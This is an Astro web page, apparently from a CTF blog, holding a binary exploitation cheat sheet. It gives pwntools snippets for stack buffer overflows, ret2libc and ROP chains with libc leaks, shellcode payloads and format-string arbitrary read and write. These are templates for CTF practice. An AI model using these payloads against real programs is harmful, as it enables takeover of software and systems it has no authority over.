@@ -1,0 +1,182 @@
+---
+import BaseHead from '../../components/BaseHead.astro';
+import Footer from '../../components/Footer.astro';
+import Header from '../../components/Header.astro';
+import { SITE_TITLE } from '../../consts';
+
+const codeRecon = `\
+checksec --file=./binary
+# Look for: NX (no shellcode on stack), PIE, Stack Canary, RELRO
+
+file ./binary               # 32 vs 64-bit, stripped?
+strings ./binary            # leaks, hints
+rabin2 -i ./binary          # imports (puts, system, gets…)
+objdump -d ./binary | grep -A5 '<main>'`;
+
+const codePwntools = `\
+from pwn import *
+
+# Connect
+p = process('./binary')          # local
+p = remote('host', PORT)         # remote
+
+# Useful helpers
+cyclic(200)                       # De Bruijn pattern
+cyclic_find(b'kaaa')              # find offset
+p64(0xdeadbeef)                   # little-endian pack (64-bit)
+p32(0xdeadbeef)                   # little-endian pack (32-bit)
+
+# Send / receive
+p.sendline(b'payload')
+p.recvuntil(b'> ')
+p.interactive()                   # drop to shell
+
+# ELF helpers
+elf = ELF('./binary')
+elf.symbols['win']                # address of function
+elf.got['puts']                   # GOT entry
+elf.plt['puts']                   # PLT stub`;
+
+const codeBufferOverflow = `\
+# 1. Find offset
+python3 -c "from pwn import *; print(cyclic(200))" | ./binary
+# Read crash → cyclic_find(b'<4 bytes at EIP/RIP>')
+
+# 2. Overwrite return address (no NX, no canary)
+payload  = b'A' * OFFSET
+payload += p64(WIN_ADDR)          # or shellcode address
+
+# 3. ret2libc (NX enabled, ASLR off)
+payload  = b'A' * OFFSET
+payload += p64(POP_RDI_RET)      # gadget: pop rdi; ret
+payload += p64(BINSH_ADDR)       # /bin/sh in libc
+payload += p64(RET_GADGET)       # stack alignment (x64)
+payload += p64(SYSTEM_ADDR)`;
+
+const codeROPchain = `\
+# Find gadgets
+ROPgadget --binary ./binary | grep "pop rdi"
+ropper -f ./binary --search "pop rdi"
+
+# Leak libc base via puts(got['puts']), then ret2main
+from pwn import *
+elf = ELF('./binary'); libc = ELF('./libc.so.6')
+rop = ROP(elf)
+rop.puts(elf.got['puts'])
+rop.main()
+payload = flat({OFFSET: rop.chain()})
+
+# After leak:
+libc.address = leaked_puts - libc.sym['puts']
+system  = libc.sym['system']
+binsh   = next(libc.search(b'/bin/sh'))`;
+
+const codeShellcode = `\
+# Only useful when NX is OFF
+from pwn import *
+context(arch='amd64', os='linux')
+sc = asm(shellcraft.sh())
+
+payload = sc + b'A'*(OFFSET-len(sc)) + p64(BUF_ADDR)
+
+# 32-bit
+context(arch='i386', os='linux')
+sc = asm(shellcraft.sh())`;
+
+const codeFormatStr = `\
+# Read from stack: %p %p %p %p ...
+./binary <<< "%p.%p.%p.%p"
+
+# Read string at known address (32-bit)
+payload = p32(TARGET_ADDR) + b"%7$s"   # adjust offset
+
+# Write arbitrary value (printf %n) — use pwntools fmtstr_payload
+from pwn import *
+payload = fmtstr_payload(OFFSET, {TARGET_ADDR: VALUE})`;
+---
+
+<!doctype html>
+<html lang="en">
+	<head>
+		<BaseHead title={`Pwn Cheat Sheet | ${SITE_TITLE}`} description="CTF binary exploitation quick reference." />
+	</head>
+	<body>
+		<Header />
+		<main>
+			<div class="breadcrumb"><a href="/posts">Posts</a> / Cheat Sheets / Pwn</div>
+			<h1>Pwn Cheat Sheet</h1>
+
+			<section>
+				<h2>Initial Recon</h2>
+				<pre><code set:text={codeRecon} /></pre>
+			</section>
+
+			<section>
+				<h2>pwntools Basics</h2>
+				<pre><code set:text={codePwntools} /></pre>
+			</section>
+
+			<section>
+				<h2>Buffer Overflow</h2>
+				<pre><code set:text={codeBufferOverflow} /></pre>
+			</section>
+
+			<section>
+				<h2>ROP Chains</h2>
+				<pre><code set:text={codeROPchain} /></pre>
+			</section>
+
+			<section>
+				<h2>Shellcode (NX off)</h2>
+				<pre><code set:text={codeShellcode} /></pre>
+			</section>
+
+			<section>
+				<h2>Format String</h2>
+				<pre><code set:text={codeFormatStr} /></pre>
+			</section>
+
+			<section>
+				<h2>Useful Tools</h2>
+				<div class="tools">
+					<span>pwntools</span><span>GDB + pwndbg</span><span>ROPgadget</span>
+					<span>ropper</span><span>checksec</span><span>one_gadget</span>
+					<span>libc-database</span><span>seccomp-tools</span><span>radare2</span>
+				</div>
+			</section>
+		</main>
+		<Footer />
+	</body>
+</html>
+
+<style>
+	.breadcrumb { font-size: 0.8em; color: var(--text-muted); margin-bottom: 1.5em; }
+	.breadcrumb a { color: var(--accent); }
+	h1 { font-size: 1.5em; margin-bottom: 1.25em; }
+	h2 { font-size: 0.95em; font-weight: 600; margin: 1.75em 0 0.6em; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.06em; }
+	section { margin-bottom: 0.5em; }
+	pre {
+		background: var(--bg-secondary);
+		border: 1px solid var(--border);
+		border-radius: 6px;
+		padding: 1em 1.2em;
+		overflow-x: auto;
+		font-size: 0.82em;
+		line-height: 1.6;
+	}
+	code { font-family: 'Fira Code', 'Consolas', monospace; }
+	.tools {
+		display: flex;
+		flex-wrap: wrap;
+		gap: 0.4em;
+		margin-top: 0.4em;
+	}
+	.tools span {
+		font-size: 0.78em;
+		padding: 3px 10px;
+		border-radius: 12px;
+		background: var(--bg-secondary);
+		border: 1px solid var(--border);
+		color: var(--text-muted);
+	}
+</style>
